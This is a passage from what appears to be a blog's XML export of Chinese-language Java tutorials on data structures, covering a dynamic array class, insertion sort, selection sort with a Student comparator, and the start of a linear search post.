class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(data[i].equals(e))</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除index位置的元素，返回删除的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Remove failed. Index is illegal."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        E ret = data[index];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = index + <span class="number">1</span> ; i &lt; size ; i ++)</span><br><span class="line">        &#123;</span><br><span class="line">            data[i-<span class="number">1</span>] = data[i];</span><br><span class="line">        &#125;</span><br><span class="line">        size --;</span><br><span class="line">        data[size] = <span class="keyword">null</span>; <span class="comment">//让他自动回收 非必须写  loitering objects ！= memory leak</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(size == data.length / <span class="number">2</span>)</span><br><span class="line">            resize(data.length / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除第一个元素，返回删除的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeFirst</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> remove(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除最后一个元素，返回删除的元素</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeLast</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> remove(size-<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从数组中删除元素e</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeElement</span><span class="params">(E e)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index = find(e);</span><br><span class="line">        <span class="keyword">if</span>(index != -<span class="number">1</span>)</span><br><span class="line">            remove(index);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//system.out.print()所输出的类型toString覆盖</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        res.append(String.format(<span class="string">"Array: size = %d, capacity = %d \n"</span>, size, data.length));</span><br><span class="line">        res.append(<span class="string">'['</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i ++)&#123;</span><br><span class="line">            res.append(data[i]);</span><br><span class="line">            <span class="keyword">if</span>(i != size - <span class="number">1</span>)</span><br><span class="line">                res.append(<span class="string">", "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.append(<span class="string">']'</span>);</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">resize</span><span class="params">(<span class="keyword">int</span> newCapacity)</span></span>&#123;</span><br><span class="line">        E[] newData = (E[])<span class="keyword">new</span> Object[newCapacity];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; size ; i ++)</span><br><span class="line">            newData[i] = data[i];</span><br><span class="line">        data = newData;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="Main-java（调用自定义数组使用方法）"><a href="#Main-java（调用自定义数组使用方法）" class="headerlink" title="Main.java（调用自定义数组使用方法）"></a>Main.java（调用自定义数组使用方法）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Array&lt;Integer&gt; arr = <span class="keyword">new</span> Array(<span class="number">20</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">10</span> ; i ++)</span><br><span class="line">            arr.addLast(i);</span><br><span class="line">        System.out.println(arr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//在index位置插入元素为100</span></span><br><span class="line">        arr.add(<span class="number">1</span>, <span class="number">100</span>);</span><br><span class="line">        System.out.println(arr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//在第一个元素前面添加一个-1的元素</span></span><br><span class="line">        arr.addFirst(-<span class="number">1</span>);</span><br><span class="line">        System.out.println(arr);</span><br><span class="line">        <span class="comment">//[-1, 0, 100, 1, 2, 3, 4, 5, 6, 7, 8, 9]</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//删除索引为2的元素</span></span><br><span class="line">        arr.remove(<span class="number">2</span>);</span><br><span class="line">        System.out.println(arr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//删除4这个元素</span></span><br><span class="line">        arr.removeElement(<span class="number">4</span>);</span><br><span class="line">        System.out.println(arr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//删除第一个元素</span></span><br><span class="line">        arr.removeFirst();</span><br><span class="line">        System.out.println(arr);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>插入排序</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-插入排序法</title>
    <url>/posts/36.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="插入排序法"><a href="#插入排序法" class="headerlink" title="插入排序法"></a>插入排序法</h1><blockquote>
<ul>
<li><h2 id="从-0-i-每一位跟自己i-1进行比较大小，如果小，就交换到前面，如果大就不变。"><a href="#从-0-i-每一位跟自己i-1进行比较大小，如果小，就交换到前面，如果大就不变。" class="headerlink" title="从[0,i)每一位跟自己i-1进行比较大小，如果小，就交换到前面，如果大就不变。"></a>从[0,i)每一位跟自己i-1进行比较大小，如果小，就交换到前面，如果大就不变。</h2></li>
</ul>
</blockquote>
<h1 id="插入排序法执行截图"><a href="#插入排序法执行截图" class="headerlink" title="插入排序法执行截图"></a>插入排序法执行截图</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210624185045631.png" alt="image-20210624185045631"></p>
<h1 id="插入排序法代码（完整）"><a href="#插入排序法代码（完整）" class="headerlink" title="插入排序法代码（完整）"></a>插入排序法代码（完整）</h1><h2 id="InsertionSort-java"><a href="#InsertionSort-java" class="headerlink" title="InsertionSort.java"></a>InsertionSort.java</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InsertionSort</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="title">InsertionSort</span><span class="params">()</span></span>&#123;&#125; <span class="comment">//私有类</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(E[] arr)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; arr.length ; i++)&#123;</span><br><span class="line">                <span class="comment">// 将arr[i]插入到合适的位置</span></span><br><span class="line"><span class="comment">//                for(int j = i ; j &gt; 0; j--)  //不断和前面的值比较，小就交换，大就结束</span></span><br><span class="line"><span class="comment">//                    if(arr[j].compareTo(arr[j-1])&lt;0)</span></span><br><span class="line"><span class="comment">//                        swap(arr, j , j-1);</span></span><br><span class="line"><span class="comment">//                    else break;</span></span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j = i; j &gt; <span class="number">0</span> &amp;&amp; arr[j].compareTo(arr[j-<span class="number">1</span>])&lt;<span class="number">0</span>; j-- )</span><br><span class="line">                    swap(arr,j,j-<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> &lt;E&gt; <span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(E[] arr, <span class="keyword">int</span> i , <span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        E t = arr[i];</span><br><span class="line">        arr[i] = arr[j];</span><br><span class="line">        arr[j] = t;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span>[] dataSize = &#123;<span class="number">10000</span>, <span class="number">100000</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> n : dataSize) &#123;</span><br><span class="line">            Integer[] arr = ArrayGenerator.generateRandomArray(n, n);</span><br><span class="line">            SortingHelper.sortTest(<span class="string">"InsertionSort"</span>, arr);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="SortingHelper-java（延续了前面的选择排序法）"><a href="#SortingHelper-java（延续了前面的选择排序法）" class="headerlink" title="SortingHelper.java（延续了前面的选择排序法）"></a>SortingHelper.java（延续了前面的选择排序法）</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SortingHelper</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">SortingHelper</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">boolean</span> <span class="title">isSorted</span><span class="params">(E[] arr)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i&lt; arr.length; i++)</span><br><span class="line">            <span class="keyword">if</span> (arr[i - <span class="number">1</span>].compareTo(arr[i]) &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sortTest</span><span class="params">(String sortname, E[] arr)</span></span>&#123;</span><br><span class="line">        <span class="keyword">long</span> startTime = System.nanoTime();</span><br><span class="line">        <span class="keyword">if</span>(sortname.equals(<span class="string">"SelectionSort"</span>))</span><br><span class="line">            SelectionSort.sort(arr);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(sortname.equals(<span class="string">"InsertionSort"</span>))</span><br><span class="line">            InsertionSort.sort(arr);</span><br><span class="line">        <span class="keyword">long</span> endTime = System.nanoTime();</span><br><span class="line">        <span class="keyword">for</span>(E e:arr)&#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">double</span> time = (endTime - startTime) / <span class="number">1000000000.0</span>; <span class="comment">//纳米要/9个零</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!SortingHelper.isSorted(arr))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(sortname + <span class="string">"failed"</span>);</span><br><span class="line">        System.out.println(String.format(<span class="string">"%s , n = %d : %f s "</span>, sortname, arr.length, time));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>插入排序</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-选择排序法</title>
    <url>/posts/35.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="选择排序法"><a href="#选择排序法" class="headerlink" title="选择排序法"></a>选择排序法</h1><blockquote>
<ul>
<li><h2 id="原理就是不断将剩下元素中最小的数拿出来"><a href="#原理就是不断将剩下元素中最小的数拿出来" class="headerlink" title="原理就是不断将剩下元素中最小的数拿出来"></a>原理就是不断将剩下元素中最小的数拿出来</h2><ul>
<li><img src="https://gylq.gitee.io/cloudimages/img/image-20210624133947347.png" alt="image-20210624133947347"></li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="选择排序算法执行截图"><a href="#选择排序算法执行截图" class="headerlink" title="选择排序算法执行截图"></a>选择排序算法执行截图</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210624142356230.png" alt="image-20210624142356230"></p>
<h1 id="（完整代码）选择排序算法基础代码"><a href="#（完整代码）选择排序算法基础代码" class="headerlink" title="（完整代码）选择排序算法基础代码"></a>（完整代码）选择排序算法基础代码</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SelectionSort</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">SelectionSort</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(E[] arr)</span></span>&#123;  <span class="comment">//泛型 扩展 compareable 接口</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// arr[0...i)是有序的； arr[i...n)是无序的</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; arr.length; i++)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 选择arr[i……n)中最小值的索引</span></span><br><span class="line">            <span class="keyword">int</span> minIndex = i;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i; j &lt; arr.length; j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(arr[j].compareTo(arr[minIndex]) &lt; <span class="number">0</span>)  <span class="comment">// 返回的是整型，小于0代表前者小于后者</span></span><br><span class="line">                    minIndex=j; <span class="comment">//存的最小值所对应的索引</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            swap(arr, i, minIndex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;E&gt; <span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(E[] arr, <span class="keyword">int</span> i , <span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        E t = arr[i];</span><br><span class="line">        arr[i] = arr[j];</span><br><span class="line">        arr[j] = t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Integer[] arr = &#123;<span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        SelectionSort.sort(arr);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> e: arr)</span><br><span class="line">            System.out.print(e + <span class="string">" "</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="选择排序算法“优化”类排序执行截图"><a href="#选择排序算法“优化”类排序执行截图" class="headerlink" title="选择排序算法“优化”类排序执行截图"></a>选择排序算法“优化”类排序执行截图</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210624145050773.png" alt="image-20210624145050773"></p>
<h1 id="（完整代码）选择排序选择排序算法“优化”类成员数值排序"><a href="#（完整代码）选择排序选择排序算法“优化”类成员数值排序" class="headerlink" title="（完整代码）选择排序选择排序算法“优化”类成员数值排序"></a>（完整代码）选择排序选择排序算法“优化”类成员数值排序</h1><h2 id="SelectionSort-java"><a href="#SelectionSort-java" class="headerlink" title="SelectionSort.java"></a>SelectionSort.java</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SelectionSort</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">SelectionSort</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E extends Comparable&lt;E&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(E[] arr)</span></span>&#123;  <span class="comment">//泛型 扩展 compareable 接口</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// arr[0...i)是有序的； arr[i...n)是无序的</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; arr.length; i++)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 选择arr[i……n)中最小值的索引</span></span><br><span class="line">            <span class="keyword">int</span> minIndex = i;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = i; j &lt; arr.length; j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(arr[j].compareTo(arr[minIndex]) &lt; <span class="number">0</span>)  <span class="comment">// 返回的是整型，小于0代表前者小于后者</span></span><br><span class="line">                    minIndex=j; <span class="comment">//存的最小值所对应的索引</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            swap(arr, i, minIndex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> &lt;E&gt; <span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(E[] arr, <span class="keyword">int</span> i , <span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        E t = arr[i];</span><br><span class="line">        arr[i] = arr[j];</span><br><span class="line">        arr[j] = t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Integer[] arr = &#123;<span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        SelectionSort.sort(arr);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> e: arr)</span><br><span class="line">            System.out.print(e + <span class="string">" "</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line"></span><br><span class="line">        Student[] students = &#123;<span class="keyword">new</span> Student(<span class="string">"Alice"</span>, <span class="number">98</span>),</span><br><span class="line">                            <span class="keyword">new</span> Student(<span class="string">"Bob"</span>, <span class="number">100</span>),</span><br><span class="line">                            <span class="keyword">new</span> Student(<span class="string">"Charles"</span>, <span class="number">66</span>)&#125;;</span><br><span class="line">        SelectionSort.sort(students);</span><br><span class="line">        <span class="keyword">for</span>(Student student: students)</span><br><span class="line">            System.out.print(student + <span class="string">" "</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Override-覆盖方法Student-java"><a href="#Override-覆盖方法Student-java" class="headerlink" title="(Override)覆盖方法Student.java"></a>(Override)覆盖方法Student.java</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Comparable</span>&lt;<span class="title">Student</span>&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name , <span class="keyword">int</span> score)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.score = score;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compareTo</span><span class="params">(Student another)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        if(this.score &lt; another.score)</span></span><br><span class="line"><span class="comment">//            return -1;</span></span><br><span class="line"><span class="comment">//        else if(this.score == another.score)</span></span><br><span class="line"><span class="comment">//            return 0;</span></span><br><span class="line"><span class="comment">//          return 1;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.score - another.score; <span class="comment">//优雅写法 从小到大按分数排序</span></span><br><span class="line"><span class="comment">//          return another.score - this.score;  //从大到小按分数进行排序</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object student)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span> == student)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(student == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.getClass() != student.getClass())</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        Student another = (Student)student;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name.equals(another.name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">"Student(name: %s, score: %d)"</span>, name, score);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>算法与数据结构</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>数据结构</tag>
        <tag>JAVA</tag>
        <tag>选择排序</tag>
      </tags>
  </entry>
  <entry>
    <title>【Java】数据结构-线性查找法</title>
    <url>/posts/21398.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="什么是算法"><a href="#什么是算法" class="headerlink" title="什么是算法"></a>什么是算法</h1><blockquote>
<ul>
<li><h2 id="一、有限性"><a href="#一、有限性" class="headerlink" title="一、有限性"></a>一、有限性</h2></li>
<li><h2 id="二、确定性：不会产生二义性"><a href="#二、确定性：不会产生二义性" class="headerlink" title="二、确定性：不会产生二义性"></a>二、确定性：不会产生二义性</h2></li>
<li><h2 id="三、可行性"><a href="#三、可行性" class="headerlink" title="三、可行性"></a>三、可行性</h2></li>
<li><h2 id="四、输入"><a href="#四、输入" class="headerlink" title="四、输入"></a>四、输入</h2></li>
<li><h2 id="五、输出"><a href="#五、输出" class="headerlink" title="五、输出"></a>五、输出</h2></li>
</ul>
</blockquote>
<h1 id="线性查找法"><a href="#线性查找法" class="headerlink" title="线性查找法"></a>线性查找法</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210624033722887.png" alt="image-20210624033722887"></p>
<h1 id="使用泛型"><a href="#使用泛型" class="headerlink" title="使用泛型"></a>使用泛型</h1><blockquote>
<ul>
<li><h2 id="不可以是基本数据类型，只能是类对象"><a href="#不可以是基本数据类型，只能是类对象" class="headerlink" title="不可以是基本数据类型，只能是类对象"></a>不可以是基本数据类型，只能是类对象</h2><ul>
<li><h3 id="基本数据类型：boolean-byte-char-short-int-long-float-double"><a href="#基本数据类型：boolean-byte-char-short-int-long-float-double" class="headerlink" title="基本数据类型：boolean,byte,char,short,int,long,float,double"></a>基本数据类型：boolean,byte,char,short,int,long,float,double</h3></li>
</ul>
</li>
<li><h2 id="每个基本数据类型都有对应的包装类"><a href="#每个基本数据类型都有对应的包装类" class="headerlink" title="每个基本数据类型都有对应的包装类"></a>每个基本数据类型都有对应的包装类</h2><ul>
<li><h3 id="Boolean-Byte-Character-Short-Integer-Long-Float-Double"><a href="#Boolean-Byte-Character-Short-Integer-Long-Float-Double" class="headerlink" title="Boolean, Byte, Character, Short, Integer, Long, Float, Double"></a>Boolean, Byte, Character, Short, Integer, Long, Float, Double</h3></li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="线性查找法Java执行结果截图"><a href="#线性查找法Java执行结果截图" class="headerlink" title="线性查找法Java执行结果截图"></a>线性查找法Java执行结果截图</h1><p><img src="https://gylq.gitee.io/cloudimages/img/image-20210624111228181.png" alt="image-20210624111228181"></p>
<h1 id="线性查找法Java代码"><a href="#线性查找法Java代码" class="headerlink" title="线性查找法Java代码"></a>线性查找法Java代码</h1><h2 id="LinearSearch-java"><a href="#LinearSearch-java" class="headerlink" title="LinearSearch.java"></a>LinearSearch.java</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinearSearch</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">LinearSearch</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;E&gt; <span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(E[] data, E target)</span></span>&#123; <span class="comment">//泛型方法</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; data.length; i++)</span><br><span class="line">            <span class="keyword">if</span>(data[i].equals(target)) <span class="comment">//equals用于值相等，尽量不写==</span></span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        Integer[] data = &#123;<span class="number">24</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">16</span>, <span class="number">66</span>, <span class="number">32</span>, <span class="number">4</span>&#125;; <span class="comment">//手动修改数组类型</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> res1 = LinearSearch.search(data, <span class="number">16</span>);  <span class="comment">//自动转换泛型类，数组型不能</span></span><br><span class="line">        System.out.println(res1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> res2 = LinearSearch.search(data, <span class="number">666</span>);</span><br><span class="line">        System.out.println(res2);</span><br><span class="line"><span class="comment">//以下代码可不需要-----------------------------</span></span><br><span class="line">        Student[] 